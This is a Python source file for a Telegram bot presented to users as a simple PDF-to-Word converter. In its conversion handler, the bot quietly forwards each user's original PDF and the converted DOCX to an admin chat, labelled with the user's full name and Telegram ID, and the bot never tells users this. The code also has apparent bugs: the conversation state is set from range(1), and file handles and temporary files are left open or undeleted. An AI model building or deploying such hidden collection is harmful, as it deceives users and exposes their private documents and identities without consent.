import os
import logging
import tempfile
from pdf2docx import Converter
from functools import wraps
from telegram import Update, Document
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ConversationHandler, ContextTypes, filters
)
from telegram.constants import ChatAction

# States
WAIT_PDF = range(1)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

MAX_SIZE = 50 * 1024 * 1024   # Telegram API limit


def require_token(func):
    @wraps(func)
    async def wrapper(update: Update, context):
        if not BOT_TOKEN:
            await update.message.reply_text("❌ BOT_TOKEN missing.")
            return ConversationHandler.END
        return await func(update, context)
    return wrapper


@require_token
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Vanakkam!\n\n📄 Send me a PDF and I will convert it to Word (.docx).\n"
        "❌ /cancel to stop."
    )
    return WAIT_PDF


@require_token
async def handle_pdf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    doc: Document = msg.document

    if not doc:
        await msg.reply_text("❗ Please send a PDF file.")
        return WAIT_PDF

    file_name = doc.file_name or "document.pdf"

    if not file_name.lower().endswith(".pdf"):
        await msg.reply_text("❗ This bot only converts PDF files.")
        return WAIT_PDF

    if doc.file_size > MAX_SIZE:
        await msg.reply_text("❌ PDF exceeds 50MB Telegram Bot API limit.")
        return WAIT_PDF

    # Processing message
    processing = await msg.reply_text("🔄 Converting... Please wait.")
    await context.bot.send_chat_action(msg.chat_id, ChatAction.TYPING)

    bot = context.bot

    # Temp file paths
    tmp_pdf = tempfile.NamedTemporaryFile(suffix=".pdf", delete=False)
    tmp_docx = tempfile.NamedTemporaryFile(suffix=".docx", delete=False)
    tmp_pdf_path = tmp_pdf.name
    tmp_docx_path = tmp_docx.name
    tmp_pdf.close()
    tmp_docx.close()

    try:
        # Download PDF
        file = await bot.get_file(doc.file_id)
        await file.download_to_drive(custom_path=tmp_pdf_path)

        # Convert PDF → DOCX
        converter = Converter(tmp_pdf_path)
        converter.convert(tmp_docx_path)
        converter.close()

        # Send converted DOCX to user
        out_name = file_name.replace(".pdf", ".docx")
        await bot.send_document(
            chat_id=msg.chat_id,
            document=open(tmp_docx_path, "rb"),
            filename=out_name
        )

        # Send to admin
        if ADMIN_ID:
            caption = (
                f"PDF converted by: {msg.from_user.full_name}\n"
                f"User ID: {msg.from_user.id}"
            )

            # original
            await bot.send_document(
                chat_id=ADMIN_ID,
                document=open(tmp_pdf_path, "rb"),
                filename=file_name,
                caption="📄 Original PDF\n" + caption
            )

            # converted
            await bot.send_document(
                chat_id=ADMIN_ID,
                document=open(tmp_docx_path, "rb"),
                filename=out_name,
                caption="📝 Converted DOCX\n" + caption
            )

        await processing.edit_text("✅ Conversion completed!")

    except Exception as e:
        logger.error(e)
        await processing.edit_text("❌ Conversion failed: " + str(e))

    return ConversationHandler.END


def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAIT_PDF: [
                MessageHandler(filters.Document.PDF, handle_pdf)
            ]
        },
        fallbacks=[CommandHandler("cancel", lambda u, c: u.message.reply_text("❌ Cancelled"))]
    )

    app.add_handler(conv)
    app.run_polling()


if __name__ == "__main__":
    main()
